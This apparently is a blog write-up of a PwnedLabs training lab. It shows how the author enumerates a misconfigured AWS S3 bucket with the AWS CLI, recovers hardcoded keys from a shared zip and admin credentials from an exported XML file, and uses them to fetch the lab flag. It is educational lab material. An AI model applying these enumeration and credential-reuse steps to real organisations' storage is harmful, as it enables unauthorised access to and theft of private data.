---
layout: blog
title: AWS S3 Enumeration Basics - PwnedLabs
publishDate: 2025-06-01T12:00:00.000Z
description: Explore AWS S3 enumeration in this beginner lab, learning how
  attackers exploit Simple Storage Service to gain footholds and escalate
  privileges.
tags:
  - pwnedlabs
  - writeup
  - aws
---
In this lab, only the URL of a website was given - `hxxp[]://]dev[.]huge-logistics[.]com`. The goal was to find a hidden S3 bucket somewhere in the website. Since S3 is a storage service, some of the website assets might have been stored in a S3 bucket, like images and scripts. So I checked the source code.

![](/images/uploads/pasted-image-20250528234045.png)

As you can see in the image above, I found the links to assets stored in  S3 bucket, named `dev.huge-logistics.com`. It is sometimes possible to view the objects stored in the bucket by visiting the directory where the assets are stored(provided, we have the appropriate permission), which in this case was `hxxps[://]s3[.]amazonaws[.]com/dev-huge-logistics.com/static`.

![](/images/uploads/pasted-image-20250528234542.png)

But as you can see, access to view the contents of the bucket was denied. This is because of a default policy set by AWS on S3 buckets.

```json
{
	"Sid": "ListBucketRootAndShared",
	"Effect": "Allow",
	"Principal": "*",
	"Action": "s3:ListBucket",
	"Resource": "arn:aws:s3:::dev.huge-logistics.com",
	"Condition": {
		"StringEquals": {
			"s3:prefix": [
				"",
				"shared/",
				"static/"
			],
			"s3:delimiter": "/"
		}
	}
},
```

By default, the AWS CLI includes prefix= (an empty prefix) and delimiter=/ in requests, while the URL `hxxps[://]s3[.]amazonaws[.]com/dev.huge-logistics.com/` that the browser sends the GET request to doesn't include these parameters. So I modified the URL by including these prefixes with appropriate values.

* Root folder of S3 bucket: `hxxps[://]s3[.]amazonaws[.]com/dev[.]huge-logistics[.]com/?prefix=&delimiter=/`

![](/images/uploads/pasted-image-20250528235404.png)

Using the CLI is always more useful.

```sh
> aws s3 ls s3://dev.huge-logistics.com --no-sign-request
                           PRE admin/
                           PRE migration-files/
                           PRE shared/
                           PRE static/
2023-10-16 13:00:47       5347 index.html
```

But in this case recursive listing of all directories is denied. Using the `--recursive` flag allows you to list the contents of the directories and subdirectories as well.

```sh
> aws s3 ls s3://dev.huge-logistics.com --no-sign-request --recursive

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
```

On listing each folder individually, the reason was found. I didn't have the permission to list the `admin/` and `migration-files/` directories.

But `static/` and `shared/` could be accessed.

```sh
> aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request
2023-10-16 11:08:33          0
2023-10-16 11:09:01        993 hl_migration_project.zip
```

The `shared/` directory had a ZIP archive `hl-migration_project.zip` which was of specific interest. I downloaded the file and unzipped it to reveal a PowerShell script.

```sh
> unzip hl_migration_project.zip
Archive:  hl_migration_project.zip
  inflating: migrate_secrets.ps1
```

```sh
> cat migrate_secrets.ps1
```

The first few lines of the PowerShell script contained the hardcoded Access Key and Secret Access Key. It contained the AWS region as well.

I used these credentials to configure AWS using the `aws configure` command. 

```sh
> aws configure
AWS Access Key ID [****************P7HK]: <access-key>
AWS Secret Access Key [****************4Hq3]: <secret-key>
Default region name [None]: us-east-1
Default output format [None]:
```

I confirmed the identity.

```sh
> aws sts get-caller-identity
{
    "UserId": "AIDA3SFMDAPOYPM3X2TB7",
    "Account": "794929857501",
    "Arn": "arn:aws:iam::794929857501:user/pam-test"
}
```

Now it was possible to list the contents of the `admin/` directory.

```sh
> aws s3 ls s3://dev.huge-logistics.com/admin/
2023-10-16 11:08:38          0
2024-12-02 09:57:44         32 flag.txt
2023-10-16 16:24:07       2425 website_transactions_export.csv
```

```sh
> aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt .
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

But I was unable to download the files. So I checked the other directory, `migration-files/`.

```sh
> aws s3 ls s3://dev.huge-logistics.com/migration-files/
2023-10-16 11:08:47          0
2023-10-16 11:09:26    1833646 AWS Secrets Manager Migration - Discovery & Design.pdf
2023-10-16 11:09:25    1407180 AWS Secrets Manager Migration - Implementation.pdf
2023-10-16 11:09:27       1853 migrate_secrets.ps1
2023-10-16 14:00:13       2494 test-export.xml
```

There were two interesting files, one PowerShell script and a XML file. Downloading and opening the XML file revealed more user credentials including an AWS IT Admin user.

![](/images/uploads/pasted-image-20250529003209.png)

Configuring AWS with the new credentials, I tried to download the flag, and this time it worked. I got the flag. The other file in the `admin/` directory contained some Personally Identifiable Information (PII).

```sh
> aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt .
download: s3://dev.huge-logistics.com/admin/flag.txt to ./flag.txt
```
